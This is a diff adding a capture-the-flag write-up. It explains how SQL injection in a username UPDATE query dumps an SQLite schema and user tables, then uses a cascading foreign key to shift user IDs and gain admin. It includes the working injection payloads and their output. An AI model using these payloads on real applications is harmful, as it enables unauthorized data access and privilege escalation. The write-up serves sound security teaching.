@@ -1,0 +1,101 @@
+The username box is a SQL UPDATE query vulnerable to injection.
+
+Using the following payload, we can see all of the SQL in the database:
+
+   " || (SELECT GROUP_CONCAT(sql) from sqlite_schema) || "
+
+The result looks something like the following:
+
+   CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT NOT NULL),
+   CREATE TABLE roles_70032c33a98ae485 (id INTEGER, admin INTEGER, 
+   FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE)
+
+(Your roles table will have a different name.)
+
+We can also use the same trick to find the contents of the other tables.
+
+   " || (SELECT GROUP_CONCAT(id || "|" || name) from users) || "
+
+yields
+  
+   0|admin,1|<WHATEVER YOUR USERNAME IS SET TO>
+
+so indeed, there is an admin with ID 0 and yourself with ID 1.
+
+Checking the roles table, we find:
+
+    " || (SELECT GROUP_CONCAT(id || "|" || admin) from roles_70032c33a98ae485) || "
+
+yields
+   
+   0|1,1|0
+
+so, as expected, the admin user has admin=1 and you do not.
+
+This suggests that we want to somehow change "admin" on the roles table.
+
+It seems difficult to directly modify the roles table in our injection.
+What we can modify with our injection is the id column.
+
+We can test this with something like this:
+   
+   j", id=2 WHERE id=1 --
+
+The command seems to succeed, but it results in the error:
+  
+   'NoneType' object is not subscriptable
+
+This makes sense if the server is just querying for id=1 to get your
+username, since changing your id to 2 would result in None as the query
+response.
+
+So, we can assume that the server is hard-coded to check id=1, which
+gives sense given the challenge title, description, etc.
+
+We can use the FOREIGN KEY constraint to our advantage, given
+the ON UPDATE CASCADE keyword.
+
+If we update the id of User #0 (which has admin set to 1) to 1, we will
+probably succeed. We also have to change the id of user #1 since it is 
+a primary key, though.
+
+Doing this in one command is (as far as I've tried) impossible, since
+SQL will update User #0 first and then User #1 (causing a UNIQUE
+constraint error).
+
+However, we can do it in two steps, like this:
+
+   ", id=2 WHERE id=0 --
+
+Now, the IDs are 1 and 2, with ID 2 having admin=1 (which you can
+verify using the roles table).
+
+Since 1 < 2 this time, we can enter
+
+   ", id=id-1 --
+
+which brings the IDs down to 0 and 1. This yields the flag.
+
+To recap, what we've done to the roles table is:
+
+(Start)
+id | admin
+0  | 1
+1  | 0
+
+(after setting id=2 where id=0)
+id | admin
+1  | 0
+2  | 1
+
+(after setting id=id-1)
+id | admin
+0  | 0
+1  | 1
+
+Now, the query SELECT admin FROM roles WHERE id=1 returns 1, and we have
+successfully convinced the server that we are an admin.
+
+
+(BTW I think making the roles table name vary was completely useless,
+but I was too lazy to remove that part of the code, sorry)
